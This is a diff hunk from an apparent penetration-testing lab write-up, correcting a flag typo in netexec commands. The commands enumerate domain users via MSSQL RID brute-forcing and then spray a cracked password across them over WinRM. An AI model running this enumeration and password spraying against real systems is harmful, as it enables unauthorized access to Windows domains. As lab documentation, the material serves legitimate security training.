@@ -142,7 +142,7 @@ Observation: domain users are enumerated through MSSQL with RID brute-forcing, a
 ```bash
 nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth --rid-brute \
       | awk 'index($0,"<LAB_DOMAIN>\\")' | awk '{print $NF}' | awk -F'\\' '{print $2}' > users.txt
-nxc winrm <TARGET_IP> -u users.txt -p '<CRACKED_PASSWORD>' --continue-on-succes
+nxc winrm <TARGET_IP> -u users.txt -p '<CRACKED_PASSWORD>' --continue-on-success
 ```
 
 ```text
